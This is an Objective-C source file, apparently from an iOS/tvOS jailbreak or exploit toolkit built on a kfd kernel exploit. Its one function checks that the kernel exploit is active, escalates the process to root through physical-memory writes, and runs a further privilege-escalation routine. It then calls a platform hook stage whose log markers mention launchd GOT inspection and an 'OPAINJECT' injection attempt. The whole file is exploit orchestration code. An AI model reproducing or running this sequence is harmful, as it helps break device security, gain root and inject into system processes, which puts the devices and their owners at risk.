#import "dt_build699_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt699_log_fn)(NSString *line);

static void dt699_log(dt699_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt699_emit(dt699_log_fn log, NSString *marker)
{
    dt699_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build699_run_platform_hook_closure(void (^log)(NSString *line), NSString **verdictOut)
{
#if DT_BUILD_NUM == 102729
    dt699_emit(log, @"BUILD102729A_SCOPE=SELF_PROCESS_MACH_VM_PROTECT_CONTROL");
#elif DT_BUILD_NUM == 102728 || DT_BUILD_NUM == 102725
    dt699_emit(log, @"BUILD102728R_SCOPE=READ_ONLY_LAUNCHD_GOT_CLOSURE_MINOS_ENCODING_FIX");
#elif DT_BUILD_NUM == 102727
    dt699_emit(log, @"BUILD102727R_SCOPE=READ_ONLY_LAUNCHD_MACHO_CONTRACT_REJECTION_TELEMETRY");
#elif DT_BUILD_NUM == 102726
    dt699_emit(log, @"BUILD102726D_SCOPE=READ_ONLY_LAUNCHD_USERSPACE_READ_PATH_DIAGNOSTIC");
#elif DT_BUILD_NUM == 102725
    dt699_emit(log, @"BUILD102725R_SCOPE=READ_ONLY_LAUNCHD_BASE_GOT_AND_PROTECTION_QUERY");
#endif
    dt699_emit(log, @"KCALL699_UI_TAP");
    dt699_emit(log, @"BUILD102699_SCOPE=NATIVE_PLATFORM_SIGNING_AND_LAUNCHD_CORRELATION");
    dt699_emit(log, @"KCALL699_NO_B4_MUTATION");
    dt699_emit(log, @"KCALL699_NO_B1_PATCH");
    dt699_emit(log, @"KCALL699_ONE_OPAINJECT_ATTEMPT_ONLY");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL699_KFD_INACTIVE";
        return -1;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0)
            dt699_log(log, @"[+] build699 root esc OK uid=0");
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL699_ROOT_FAIL";
        return -2;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL699_BUILD97_FAIL";
        return -3;
    }

    NSString *kernelVerdict = nil;
    int r = dt699_run_platform_hook_closure(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"BUILD102699_DIAGNOSTIC_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"BUILD102699_DIAGNOSTIC_COMPLETE";
    dt699_emit(log, @"KCALL699_PHASE_PASS");
    return 0;
}
